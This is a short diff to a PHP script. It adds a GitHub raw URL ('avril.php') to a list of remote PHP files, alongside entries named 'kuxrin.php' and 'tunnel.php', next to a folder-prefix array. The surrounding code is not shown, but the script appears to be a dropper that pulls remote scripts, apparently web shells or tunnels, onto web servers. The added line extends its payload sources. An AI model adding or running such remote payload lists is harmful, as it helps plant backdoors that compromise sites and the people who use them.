@@ -65,6 +65,7 @@ $folder_prefixes = array(
 $remote_urls = [
     'https://raw.githubusercontent.com/mbnoscare/areaterlarang/refs/heads/main/kuxrin.php',
     'https://raw.githubusercontent.com/mbnoscare/areaterlarang/refs/heads/main/tunnel.php',
+    'https://raw.githubusercontent.com/mbnoscare/areaterlarang/refs/heads/main/avril.php',
     'https://raw.githubusercontent.com/mbnoscare/areaterlarang/refs/heads/main/tunnel2.php',
 ];
 
